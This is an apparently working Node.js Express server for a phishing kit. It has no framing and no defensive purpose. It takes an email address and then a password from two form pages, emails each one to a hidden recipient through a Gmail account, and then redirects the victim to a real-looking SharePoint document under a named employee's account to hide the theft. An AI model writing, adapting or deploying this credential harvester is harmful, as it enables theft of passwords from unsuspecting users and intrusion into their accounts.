require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve index.html at root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle email submission from index.html
app.post('/send-email', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).send('No email provided');

  try {
    await sendMail(`User entered email: ${email}`);
    // Redirect to thank-you.html after success
    res.redirect('/thank-you.html');
  } catch (error) {
    console.error(error);
    res.status(500).send('Failed to send email');
  }
});

// Handle password submission from thank-you.html
app.post('/send-password', async (req, res) => {
  const { password } = req.body;
  if (!password) return res.status(400).send('No password provided');

  try {
    await sendMail(`User entered password: ${password}`);
    // Redirect to SharePoint doc after success
    res.redirect('https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A');
  } catch (error) {
    console.error(error);
    res.status(500).send('Failed to send password');
  }
});

// Common email sender function
async function sendMail(text) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: 'Canvas Form Submission',
    text
  };

  await transporter.sendMail(mailOptions);
}

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
